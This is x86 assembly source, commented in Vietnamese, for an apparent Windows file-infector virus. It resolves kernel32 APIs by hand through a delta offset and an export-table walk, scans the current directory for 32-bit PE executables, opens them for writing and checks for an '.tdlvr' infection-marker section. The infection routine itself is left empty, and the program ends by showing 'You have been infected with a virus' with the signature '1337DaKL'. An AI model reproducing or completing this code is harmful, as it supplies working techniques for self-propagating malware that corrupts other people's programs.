.386
.model flat, stdcall
.stack 100h
option casemap:none
.code
WIN32_FIND_DATAA STRUC
    dwFileAttributes     dd ?
    ftCreationTimeLow    dd ?
    ftCreationTimeHigh   dd ?
    ftLastAccessTimeLow  dd ?
    ftLastAccessTimeHigh dd ?
    ftLastWriteTimeLow   dd ?
    ftLastWriteTimeHigh  dd ?
    nFileSizeHigh        dd ?
    nFileSizeLow         dd ?
    dwReserved0          dd ?
    dwReserved1          dd ?
    cFileName            db 260 dup(?)
    cAlternateFileName   db 14 dup(?)
WIN32_FIND_DATAA ENDS
print proc 
	mov edx , dword ptr [ebp + offset offsetString]
	add edx , ebp
	push 0
	push 0
	push edx
	push 0
	call dword ptr [ebp + offset handleMessageBoxA ]
	
	
	ret

print endp

read proc 

	mov edx , offset data
	add edx , ebp	
	push 100
	push edx 
	call dword ptr [ebp + offset handleRtlZeroMemory]
	
	mov edx , offset data
	add edx , ebp
	
	push 0
	push 0
	push dword ptr [ebp + offset number]
	push edx
	push dword ptr [ebp + offset handleFile]
	call dword ptr [ebp + offset handleReadFile]
	ret

read endp
alignFunc proc	
	;eax : value , eax : aling
	xor edx , edx 
	div ecx 
	cmp edx , 0
	je ok
	inc eax
ok:
	mul ecx
	;luc nat eax da co duoc gia tri sau khi align
	ret

alignFunc endp
readNow proc 

	mov edx , offset data
	add edx , ebp	
	push 100
	push edx 
	call dword ptr [ebp + offset handleRtlZeroMemory]
	
	mov edx , offset data
	add edx , ebp
	
	push 0
	push 0
	push dword ptr [ebp + offset number]
	push edx
	push dword ptr [ebp + offset handleFileNow]
	call dword ptr [ebp + offset handleReadFile]
	ret

readNow endp
main: ;main----
	call Delta ; call den label de lay dia chi thuc su tren bo nho
Delta:
	pop ebp ; sau do lau dia chi do ra
	sub ebp , offset Delta ; tru di di chi tu label toi base cua chuong trinh tren bo nho
	mov dword ptr [ebp + offset va] , ebp ; chuoi cung la duoc dia chi base cua chuong trinh
	;------------------------------------Get
	mov esi , dword ptr [esp]  ; lay vi tri hien tai cua chuong trinh
	and esi , 0FFFF0000h ; sau do xoa 10000 bit thap
GetKernel32:
case1:
;limit la so vong lap
	cmp dword ptr [ebp + offset limit] , 00h ; neu chay het so luong limit vong lap thi se dung laij
	je GetKernel32Error ; khong tim thay base cua kernel32
	cmp word ptr [esi] , "ZM" ; neu khong phai thif so sanh chu ki
	je CheckPE ; neu la MZ thi la file co the thuc hien tren he dieu hanh windows va MSDOS chuyen sang check xem co phai file thuc thi hay khong
case2:
	sub esi , 10000h ; neu khong phai thi tiep tuc lui 10000 de tim base kernel32
	dec dword ptr [ebp + offset limit] ; giam di mot vong lap
	jmp case1 ; sau do lap lai
CheckPE: ; con neu la file thuc thi
	mov edi , dword ptr [esi + 3Ch] ; tien hanh doc ifanew 
	add edi , esi  ; sau do add them vi tri base cua chuong trinh
	cmp dword ptr [edi] , "EP" ; so sanh
	je GetKernel32Success ; neu dung thi la can tim
	jmp case2 ; neu khong thi nhay den case2 de lap lai
GetKernel32Error:
	mov esi , 0BFF7000h	 ; neu chay het so limit vong lap ma chua tim thay thi de mac dinh la o vi tri nay
GetKernel32Success:
	mov eax , esi ; neu tim thay thi 
	mov eax , dword ptr [eax + 3ch] ; nhay den ifanew cua kernel 32
	add eax , esi ; sau do add them base
	add eax , 120 ; nhay dem directory cua export table
	mov eax , dword ptr [eax] ; doc dia chi ao tuong doi cua export table
	add eax , esi ; dia chi tuyet doi den export table
    mov edx, [eax + 28]     ; bo qua cac thu khong can thiet
    add edx, esi ; add them dia dia base
    mov dword ptr [ebp + offset AddressFunc], edx ; luu dia chi ai

    mov ecx, [eax + 32]    
    add ecx, esi
    mov dword ptr [ebp + offset AddressName], ecx ; luu cac dia chi

    mov ebx, [eax + 36]     
    add ebx, esi
    mov dword ptr [ebp + offset AddressOrd], ebx ; luu caca dia chi
	
	
	;;;;;
	mov ecx , dword ptr [ebp + offset AddressName] ; sau do tien hanh tim ten ham GetProcAddress
loopFindGetProcAddress:
	mov eax , dword ptr [ecx] ; lay dia chi ao tuong doi cua name func
	add eax , esi ; dia chi thuc su cua name func
	mov edi , -1 ;
	mov ebx , 0
loopOneChar: ; tien hanh so sanh
	inc edi 
	cmp byte ptr [eax + edi] , 0
	je endFindAddress
	cmp byte ptr [ebp + offset GetProcAddressName + edi] ,0 
	je endFindAddress
	mov dh , byte ptr [ebp + offset GetProcAddressName + edi]
	cmp dh , byte ptr [eax + edi]
	je loopOneChar
	inc dword ptr [ebp + offset index] ; moi vong lap thi tang index len de lay index
	add ecx , 4
	jmp loopFindGetProcAddress
endFindAddress:
	; sau do ta co index 
	mov ebx , dword ptr [ebp + offset index]
	mov edx , dword ptr [ebp + offset AddressOrd]
	movzx ecx, word ptr [edx + ebx*2]  ; tien hanh lay gia tri ordrin[index] , tuc la lay gia tri tai index trong mang cac oridin
	mov edx , dword ptr [ebp + offset AddressFunc]
    mov eax, dword ptr [edx+ ecx*4]  ; oridin lai la index tring mang dia chi ham can tim
    add eax, esi ; add them dia chi base de tim duoc dia chi thuc su cua ham
	mov dword ptr [ebp + offset handleGetProcAddress] , eax ; luu lai hamdle la base cua ham GetProcAddress
	mov edx , offset LoadLibraryName ; sau do tien hanhf dung ham GetProcAddress de tien hanh timf handle cua ham LoadLibraryName
	add edx , ebp
	push edx
	push esi
	call eax
	mov dword ptr [ebp + offset handleLoadLibrary] , eax ; luu lai
	mov dword ptr [ebp + offset handleKernel32] , esi
	;gio da co 2 handle cua ham quan trong nhat gio chi can duyet file cac kieu thoi nhi
	;------------------------------------------------------
	;------------------chuan bi cac handle------------------
	;=======================================================
	;MessageBox
	mov edx , offset user32 ; lay handle cua thu vien user32
	add edx , ebp
	push edx
	call dword ptr [ebp + offset handleLoadLibrary]
	mov dword ptr [ebp + offset handleUser32] , eax
	
	mov edx , offset MessageBoxAName
	add edx , ebp 
	push edx 
	push dword ptr [ebp + offset handleUser32]
	call dword ptr [ebp + offset handleGetProcAddress] ; lay handle cua messagename
	
	mov dword ptr [ebp + offset handleMessageBoxA] , eax ;; luu lai 
	;GetModuleFileNameAName
	mov edx , offset GetModuleFileNameAName
	add edx , ebp
	push edx 
	push dword ptr [ebp + offset handleKernel32]
	call dword ptr [ebp + offset handleGetProcAddress]
	mov dword ptr [ebp + offset handleGetModuleFileNameA] , eax ; lay handle ham lay duong dan file dang chay
	;CloseHandleName
	mov edx , offset CloseHandleName
	add edx , ebp
	push edx 
	push dword ptr [ebp + offset handleKernel32]
	call dword ptr [ebp + offset handleGetProcAddress]
	mov dword ptr [ebp + offset handleCloseHandle] , eax ; lay duong dan ham dong handle
	;FindFirstFileAName
	mov edx , offset FindFirstFileAName
	add edx , ebp
	push edx
	push esi
	call dword ptr [ebp + offset handleGetProcAddress]
	mov dword ptr [ebp + offset handleFindFirstFileA] , eax ; lau handle cua ham duyet file
	;----------------------------
	;FindNextFileA 
	mov edx , offset FindNextFileAName
	add edx , ebp
	push edx 
	push dword ptr [ebp + offset handleKernel32]
	call dword ptr [ebp + offset handleGetProcAddress]
	mov dword ptr [ebp + offset handleFindNextFileA] , eax ; lau handle findNextFile
	
	;-------------------------------
	mov edx , offset RtlZeroMemoryName; lay handle cua ham reset vung nho
	add edx , ebp
	push edx 
	push dword ptr [ebp + offset handleKernel32]
	call dword ptr [ebp +offset handleGetProcAddress]
	mov dword ptr [ebp + offset handleRtlZeroMemory] , eax
	
	;=======================================================
	;---------Ket thuc chuan bi cac ham--------------------
	;------------------------------------------------------
	
	
	;----------------------------------------------------
	;-------------Lay payload va cac thu can thiet--------
	;=====================================================
	mov eax , offset pathNow
	add eax , ebp
	push 100
	push eax 
	push 0
	call dword ptr [ebp + offset handleGetModuleFileNameA]
	
	mov dword ptr [ebp + offset offsetString] , offset pathNow
	call print	
	
	;======================================================
	;-------ket thuc lay payload--------------------------
	;------------------------------------------------------
	mov edx , offset GetCurrentDirectoryName
	add edx , ebp
	push edx
	push esi
	call dword ptr [ebp + offset handleGetProcAddress] ; lay handel cua ham lay duong dan cua thu muc hien tai
	
	mov edx , offset path
	add edx , ebp 
	push edx 
	push 100
	call eax ;; lay duoc duong dan thu muc hien tai  
	
	mov  ecx , 0
loopNewPath:	; tao ra thu muc moi de tien hanh loop file
	cmp byte ptr [ebp + offset path + ecx] , 0
	je nextLoopPath
	inc ecx
	jmp loopNewPath
nextLoopPath:
	mov byte ptr [ebp + offset path + ecx] , "\"
	mov byte ptr [ebp + offset path + ecx + 1] , "*"
	;;da lay duoc thu muc can tim ------------------------------------
	;;; duoc duong dan day du 
	mov edx , offset wfd 
	add edx , ebp 
	push edx
	mov edx , offset path
	add edx , ebp
	push edx
	call dword ptr [ebp + offset handleFindFirstFileA] ; call FindFirstFileA de tim handle duyet file
	mov dword ptr [ebp + offset handle] , eax ; luu vao handle
	
	
	;; loop tung file
loopFileok:
	mov edx , offset wfd
	add edx , ebp 
	push edx
	push dword ptr [ebp + offset handle]
	call dword ptr [ebp + offset handleFindNextFileA] ; tien hanh duyet file
	cmp eax , 0 ; neu duyet xong file thi dung chuong trinh chuyen sang attack
	je endMain
	cmp dword ptr [ebp + wfd.dwFileAttributes] , 10h ; so sanh xem co phai thu muc hay khong
	jz loopFileok ; neu la thu muc thi bo qua lap lai
	cmp byte ptr [ebp + wfd.cFileName] , "." ; so sanh xem co phai thu muc hien tai khong
	je loopFileok ; neu la file hien tai thi bo qua
	cmp byte ptr [ebp + wfd.cFileName + 1] , "." ; so sanh xem co phai thu muc truoc do khong
	je loopFileok
	;---------------------------------------
	;--------Bat dau xu li lay file--------
	;-----------------------------------------
	;main
	
	
	mov edx , offset pathNew
	add edx , ebp	
	push 100
	push edx 
	call dword ptr [ebp + offset handleRtlZeroMemory] ; reset lai cung nho cua noi luu duong dan file cua cac ham
	mov ecx , 0
	;---------------------layduong dan moi-------------------------
loopGetNewName:
	cmp byte ptr [ebp + offset path + ecx] , 0
	je endLoopNewName
	mov dl , byte ptr [ebp + offset path +ecx]
	mov byte ptr [ebp + offset pathNew +ecx] , dl
	inc ecx 
	jmp loopGetNewName
endLoopNewName:
	mov byte ptr [ebp + offset  pathNew + ecx - 1] , 0
	dec  ecx
	mov ebx , 0
loopGetNewName2:
	cmp byte ptr [ebp + offset wfd.cFileName + ebx ] , 0
	je endloopGetNewName2
	mov dl ,byte ptr [ebp + offset wfd.cFileName +ebx]
	mov byte ptr [ebp + offset pathNew +ecx] , dl
	inc ecx
	inc ebx
	jmp loopGetNewName2
endloopGetNewName2:
	; --------------da lay duoc duong dan cau cac file khac thu muc----------------------
	mov edx , offset CreateFileName
	add edx , ebp
	push edx 
	push dword ptr [ebp + offset handleKernel32]
	call dword ptr [ebp + offset handleGetProcAddress]
	mov dword ptr [ebp + offset handleCreateFile] , eax ; lay handle cua ham mo file
	
	mov edx , offset pathNew
	add edx , ebp
	push 0
	push 128
	push 3
	push 0
	push 0
	push 0C0000000h
	push edx
	call dword ptr [ebp + offset handleCreateFile]
	mov dword ptr [ebp + offset handleFile] , eax ; tien hanh mo file khi duyet voi quyen doc va ghi
	
	;------------
	
	mov edx , offset ReadFileName
	add edx , ebp
	push edx 
	push dword ptr [ebp + offset handleKernel32]
	call dword ptr [ebp + offset handleGetProcAddress]
	mov dword ptr [ebp + offset handleReadFile ] , eax ; lay handle cua ham doc file
	
	mov edx , offset WriteFileName
	add edx , ebp
	push edx 
	push dword ptr [ebp + offset handleKernel32]
	call dword ptr [ebp + offset handleGetProcAddress]
	mov dword ptr [ebp + offset handleWriteFile ] , eax ; lay handle cua ham ghi vao file
	;---------------------------------------
	;-------------check Pe;------------------
	mov dword ptr [ebp + offset number] , 2 ; doc 2 ki tu dau tien
	call read
	cmp word ptr [ebp + offset data] , 5A4Dh ; neu la MZ thi dung 
	jne loopFileok; neu khong thi bo qua file nay luon
	;----------------
	mov edx , offset SetFilePointerName
	add edx , ebp 
	push edx 
	push dword ptr [ebp + offset handleKernel32]
	call dword ptr [ebp + offset handleGetProcAddress]
	mov dword ptr [ebp + offset handleSetFilePointer] , eax ; la handle cua ham chinh con tro trong file
	
	push 0
	push 0
	push 60
	push dword ptr [ebp + offset handleFile]
	call dword ptr [ebp + offset handleSetFilePointer] ; nhay den ifanew cua file
	
	mov dword ptr [ebp +offset number] , 4
	call read ; doc 4 byte de lay ifanvie
	mov eax ,dword ptr [ebp + offset data]
	mov dword ptr [ebp + offset ifanew] , eax 
	push 0
	push 0
	push dword ptr [ebp + offset data]
	push dword ptr [ebp + offset handleFile]
	call dword ptr [ebp + offset handleSetFilePointer] ; nhay den signature cua FE header
	
	mov dword ptr [ebp + offset number] , 4
	call read ; doc 4 byte chu ki
	
	cmp dword ptr [ebp + offset data ] , 00004550h ; so sanh xem co phai la PE khong
	jne loopFileok ; neu khong phai thi bo qua file nay luon
	;--------------------------------------------------------
	;------------------------ket thuc check PE -----------------
	;----------------------------------------------------------
	; luc nay ta chi duyet nhung file PE thoi
	push 1
	push 0
	push 20
	push dword ptr [ebp + offset handleFile]
	call dword ptr [ebp + offset handleSetFilePointer] ; nhay den vi tri de doc xem no la file thuc thi 32 bit hay 64 bit
	
	mov dword ptr [ebp + offset data] , 2
	call read ; doc 2 byte lay cai can lay
	cmp word ptr [ebp +offset data] , 010Bh ; doc xem no co phai la file thuc thi 32 bit hay khoong
	jne loopFileok ; neu no khong phai la file 32 bit thi bo qua 
	;-------------------------------------------------------------------------------------------|
	;---------|||Den luc nay ta chi con nhung file co the lau nhiem duoc|||---------------------|
	push 0
	push 0
	push dword ptr [ebp + offset ifanew]
	push dword ptr [ebp + offset handleFile]
	call dword ptr [ebp + offset handleSetFilePointer] ; nhay den ifanview
	
	
	push 1
	push 0
	push 248
	push dword ptr [ebp + offset handleFile]
	call dword ptr [ebp + offset handleSetFilePointer] ; sau do nhay den base cua section table
	
	mov dword ptr [ebp + offset number] , 8
	call read ; doc ten section dau tien
	
	mov ecx , 0
loopSoSanh:
	cmp byte ptr [ebp + offset nameSectionPayload + ecx] , 0 ; so sanh den ki tu cuoi cung thi tuc la no giong nhau
	je loopFileok ; neu no giong nhau tuc la no da bi lay lan nen tien hanh bo qua file nay
	mov al , byte ptr [ebp + offset nameSectionPayload + ecx]
	cmp byte ptr [ebp + offset data + ecx] , al ; so sanh xem 2 ki tu c giong nhau khong
	jne nextSection ; eu khong giong thi nhay toi section tiep theo
	inc ecx ; neu khong thi ++index va tiep tuc
	jmp loopSoSanh
nextSection: ; neu section nay chua giong thi tiep tuc
	push 1
	push 0
	push 32
	push dword ptr [ebp + offset handleFile]
	call dword ptr [ebp + offset handleSetFilePointer]; nhay tiep toi base cua chuong trinh tiep theo
	
	mov dword ptr [ebp + offset number] , 8 ; doc 8 byte 
	call read
	cmp dword ptr [ebp + offset data] , 0 ; so sanh xem co phai byte rong khong
	je notInfected ; neu dung thi nhay
	mov ecx , 0
	jmp loopSoSanh
	;-------------------------------------------------------------
	;-------------Day la file can phai lay lan---------------------
	;==============================================================
notInfected	:
	
	
	
	
	
	
	
	
	;;=====================close============================
	jmp loopFileok
	;---------------------------------------------
	;-----Ket thuc xu li lay file-------------------
	;----------------------------------------------
	;;end
endMain:
	;------------------------------------------------
	;-----------Bat dau virus tan cong---------------
	;===============================================
	mov dword ptr [ebp + offset offsetString] , offset notificationMalware
	call print	
	;=================================================
	;-----------Ket thuc virus tan cong---------------
	;------------------------------------------------
	;endattack
;data---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
payload db 1000 dup (0)
virtualSize dd ?
rawSize dd ?
rawAddress dd ?
virtualAddress dd ?


entrypoint dd ?
i dd 0
handleFileAppend dd ?
charactic dd 0E0000020h
vs1 dd ?
va1 dd ?
rs1 dd ?
ra1 dd ?
sectionAlignment dd ?
fileAlignment dd ?

CloseHandleName db "CloseHandle" , 0
handleCloseHandle dd ?
handleFileNow dd ?
pathNow db 100 dup (0)
GetModuleFileNameAName db "GetModuleFileNameA" , 0
handleGetModuleFileNameA dd ?
nameSectionPayload db ".tdlvr" ,0 , 0, 0
SetFilePointerName db "SetFilePointer" , 0
handleSetFilePointer dd ?
WriteFileName db "WriteFile" , 0
handleWriteFile dd ?
ReadFileName db "ReadFile" , 0
handleReadFile dd ?
CreateFileName db "CreateFileA" , 0
handleCreateFile dd ?
RtlZeroMemoryName db "RtlZeroMemory" , 0
handleRtlZeroMemory dd ?
FindNextFileAName db "FindNextFileA" , 0
handleFindNextFileA dd ?
user32 db "user32.dll" , 0
handleUser32 dd ?
AddressName dd ?    
AddressOrd  dd ?    
AddressFunc dd ?    
index dd 0
FindFirstFileAName db "FindFirstFileA" , 0
handleFindFirstFileA dd ?
MessageBoxAName db "MessageBoxA" , 0
handleMessageBoxA dd ?
GetCurrentDirectoryName db "GetCurrentDirectoryA" , 0
GetProcAddressName db "GetProcAddress",0
LoadLibraryName db "LoadLibraryA" , 0
handleLoadLibrary dd ?
handleGetProcAddress dd ?
handleKernel32 dd ?
limit dd 20
kernel32Base dd ?
infectorCheck db 0
va dd ?
path db 100 dup (0) ;
handle dd ?
handleFile dd ?
pathNew db 100 dup (0)
data db 100 dup (0)
flagCheckExe db ?
ifanew dd ?
sectionNumber dw ?
wfd WIN32_FIND_DATAA <>
offsetString dd ?
number dd ?
notificationMalware db "You have been infected with a virus", 0Dh , 0Dh  , "                      --1337DaKL--" , 0
end main
